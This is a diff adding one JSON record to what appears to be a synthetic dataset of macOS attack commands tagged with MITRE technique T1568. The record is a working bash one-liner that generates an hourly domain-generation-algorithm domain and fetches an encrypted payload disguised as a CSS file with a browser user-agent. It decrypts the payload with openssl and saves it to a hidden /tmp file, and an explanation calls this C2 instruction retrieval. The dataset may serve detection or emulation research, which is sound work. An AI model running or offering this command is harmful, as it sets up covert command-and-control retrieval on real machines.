@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "seed=\"$(hostname)$(date -u +%Y%m%d)\"; key=$(echo -n \"$seed\" | md5 -q); dga=\"$(echo -n \"$(date -u +%Y%m%d%H)\" | md5 -q | cut -c1-10).static-cdn-assets.com\"; ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; wget -qO- --user-agent=\"$ua\" --header=\"Accept: text/css,*/*;q=0.1\" --timeout=10 \"http://$dga/css/theme.css\" | /usr/bin/openssl enc -aes-256-cbc -d -base64 -K \"$key\" -iv \"00000000000000000000000000000000\" > /tmp/.aes_cmd",
+  "explanation": "Combines hourly DGA for dynamic C2 resolution with AES-256-CBC decryption of base64-wrapped instructions, using a key derived from host and date for per-host variability.",
+  "rationale_steps": [
+    "Generate hour-based DGA domain for resilient resolution.",
+    "Fetch encrypted payload via a realistic CSS path and UA.",
+    "Decrypt using OpenSSL AES-256-CBC and store instructions locally."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-30dbd482",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
